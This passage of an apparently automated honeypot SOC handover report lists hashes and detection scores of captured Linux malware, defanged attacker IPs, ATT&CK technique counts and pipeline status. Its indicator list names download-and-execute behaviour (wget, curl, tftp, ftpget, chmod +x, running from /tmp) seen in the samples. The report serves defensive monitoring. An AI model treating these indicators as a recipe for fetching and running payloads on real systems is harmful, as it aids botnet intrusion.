| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 63/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `417e065ee49c19c83c0e9cd99b702efde39d77b6c02d56b69a6c56b93d275ff3` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `417e065ee49c19c8...` | 47/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `175.100.107[.]238` | KH | VIETTEL (CAMBODIA) PTE., LTD. | **100** ⚠️ | 50 |
| `103.230.176[.]152` | IN | AXOM INTERNET SERVICES PRIVATE LIMITED | **100** ⚠️ | 50 |
| `81.236.211[.]54` | SE | Telia Network Services | **100** ⚠️ | 50 |
| `122.117.30[.]20` | TW | Chunghwa Telecom Data Communication Business Group | **100** ⚠️ | 5 |
| `190.223.36[.]108` | PE | America Movil Peru S.A.C. | **100** ⚠️ | 50 |
| `18.116.101[.]220` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `61.145.163[.]164` | CN | shenzhenshihonghuyijiehongbodasha11lou1101 | **100** ⚠️ | 50 |
| `2.55.122[.]202` | IL | Partner Communications Ltd. | **100** ⚠️ | 50 |
| `197.242.170[.]10` | MZ | IS - Internet Solutions Mozambique, Limitada | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 50 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 37 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |

---

## 🔕 False Positive Summary (15 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 12 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 115 cases |
| Tool 34  | Credential Extractor        | ✅ 53 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 64 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 15 filtered (13.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 47 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 27 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 37 priority case(s) shown individually · 21 recon entry/entries in table (10 group(s) consolidating 52 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-28T19:39:48Z_
